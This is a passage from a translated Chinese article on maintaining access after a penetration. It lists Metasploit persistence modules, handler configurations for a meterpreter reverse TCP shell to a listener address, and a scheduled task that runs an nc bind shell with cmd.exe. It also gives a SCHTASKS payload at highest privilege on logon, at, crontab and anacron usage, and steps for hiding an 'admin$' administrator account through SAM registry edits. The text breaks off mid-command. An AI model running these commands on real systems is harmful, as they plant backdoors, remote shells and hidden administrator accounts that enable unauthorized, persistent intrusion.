# 渗透之权限维持杂谈
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> 这是一篇介绍渗透测试后阶段权限维持的文章，里面包括了当今服务器的两大主流操作系统linux和windows的相关维权技术。全文秉着学习的思想做个摘录。
## 0x01 MSF
###  persistence
> msf内置的后渗透权限维持工具persistence
###  Metsvc
它是通过在已经获得shell的目标主机上开启了一个服务来提供后门的功能。  
`run Metsvc -h`
###  Scheduleme & Schtasksabuse
msf中自动利用计划任务的后门程序，后面会聊到linux和windows平台的计划任务。
    run scheduleme -h
    # 例子：上传nc并创建计划任务每一分钟执行一次 'nc -e cmd.exe -L -p 8080'
    run scheduleme -m 1 -e /tmp/nc.exe -o "-e cmd.exe -L -p 8080" 
    run Schtasksabuse -h
    # 例子：每隔4秒执行一次calc.exe 
    run schtasksabuse -t 192.168.2.7 -c "cmd /c calc.exe" -d 4
###  Mof_ps_persist
> 现在已经找不到这个利用模块，参考： modules/blob/master/persistence/mof_ps_persist.rb>
###  Autorunscript
获取shell的时候自动执行持续化脚本,可以被Autorunscript执行的命令目录在`metasploit/scripts/meterpreter`
    # persistence
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 192.168.2.101
    set LPORT 5555
    set ExitOnSession false
    set AutoRunScript persistence -r 192.168.2.101 -p 5556 -U -X -i 30
    exploit
    # metsvc
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 192.168.2.101
    set LPORT 5555
    set ExitOnSession false
    set AutoRunScript metsvc -A
    exploit
## 0x02 计划任务
无论是windows还是linux操作系统都提供计划任务功能，来实现定时或者周期性的执行一些指令。自然而然我们可以在计划任务中做手脚，埋后门。
###  windows
  * 图形化工具：taskschd.msc
  * 命令行工具：schtasks.exe
    SCHTASKS /parameter [arguments]
    描述:
        允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任
        务。
    参数列表:
        /Create         创建新计划任务。
        /Delete         删除计划任务。
        /Query          显示所有计划任务。
        /Change         更改计划任务属性。
        /Run            按需运行计划任务。
        /End            中止当前正在运行的计划任务。
        /ShowSid        显示与计划的任务名称相应的安全标识符。
        /?              显示此帮助消息。
    Examples:
        SCHTASKS
        SCHTASKS /?
        SCHTASKS /Run /?
        SCHTASKS /End /?
        SCHTASKS /Create /?
        SCHTASKS /Delete /?
        SCHTASKS /Query  /?
        SCHTASKS /Change /?
        SCHTASKS /ShowSid /?
    Payload examples:
        SCHTASKS /Create /TN update /TR xx(待执行的命令)  /DELAY ONLOGON /F /RL HIGHEST
###  linux
  * 一次性执行任务：at命令———>atd进程
  * 周期性执行任务：crontab命令———>crond进程
> 在实际的渗透过程中我们更倾向于使用crontab
**at**
    - 1.服务开启
    service atd start
    - 2.基本格式
    at  [HH:MM]  [yyyy-mm-dd]  #没有指定年月日的，默认是当天的。
    - 3.查询当前设置的at任务列表
    atq  #或at -l
    - 4.删除指定任务编号的at任务
    atrm 编号  #或at -d
    - 5.查看计划任务的具体内容
    at -c 任务号
    - 6.使用文件中的命令作为计划任务（比较少用）
    at 时间 -f 文件
    - 7.相关文件
    /etc/at.deny：#该名单里面的人不可以使用
    /etc/at.allow：#只有该名单里面的人可以使用
####  **crontab**
> 注意：  
>  （1）crontab 只会在/sbin、/bin、/usr/sbin、/usr/bin下查找命令，如果命令不在这些目录中，应该要使用绝对路径。  
>  （2）只有root用户可以管理其他用户的周期性任务  
>
> （3）crontab在重启后之前的周期性任务无效，anacron可以弥补crontab的缺陷。配置文件：/etc/anacrontab。anacrontab会开机自动检查没有执行的计划任务，然乎逐一执行，这个过程是用户透明的。一般而言，crontab就已经可以满足基本的需求。
    - 1.服务开启
     service crond start
    - 2.编辑计划任务
    crontab  -e  -u  用户名
    - 3.查看计划任务
    crontab  -l  -u  用户名
    - 4.删除计划任务：
    crontab  -r  -u  用户名
    - 相关文件
    /var/spool/cron/用户名  #用户定义的设置
    /var/log/cron           #cron服务的日志文件
    /etc/crontab            #cron服务配置文件：
**anacron**
anacron是一个不同于crontab的任务，其只精确到天，用来弥补服务器在宕机下crond调度不周以及缓解计划任务执行过于集中的问题。它需要记录上次执行的时间，并更新到相应的/var/spool/anacron目录下，下次执行的时候会将当前时间和上次记录的时间进行对比，如果满足大于/etc/anacron的配置的天数就会立即执行相应的命令，然后刷新时间。
    anacron 命令行参数：
    -t 配置文件路径
    让anacron从指定配置文件中读取配置，常用于普通用户来管理个人任务
    -S spooldir
    设定新的spool目录来记录任务执行的时间戳，常用于普通用户来管理个人任务
    -T
    测试配置文件是否正确
    -f
    强制执行所有的任务，而不管之前的执行日期是否超过轮回天数
    -u
    将所有任务的执行日期都更新为当前日期，而不真正的执行任务
    -s
    串行地执行任务，只有前一个任务完成后才开始下一个任务
## 0x03 windows权限维持
###  影子账户
创建一个无法用用户本机用户罗列工具显示的用户，并且赋予管理员权限。所有操作需要有管理员权限。同时测试在windows server
2012服务器域环境下影子账户无法直接进行添加。
  1. 用’$’创建匿名用户，并归到administratorsa用户组 
        net user admin$ Test1 /add
    net localgroup administrators admin$ /add
  2. 导出匿名用户对应的sam目录下的注册表键值 
        regedt32.exe 打开 HKEY_LOCAL_MACHINESAMSAMDomainsAccountUsers键值，导出Names下用户目录以及对应的16进制目录。注意需要给Administrator用户赋予Sam键值权限，默认是不允许的。
删除匿名用户，双击导出的注册表文件，用先前导出的注册表键值对注册表进行修改。则可以重新还原之前的匿名用户，但是除了在注册表里面有用户记录，其他地方都不存在用户的信息。`net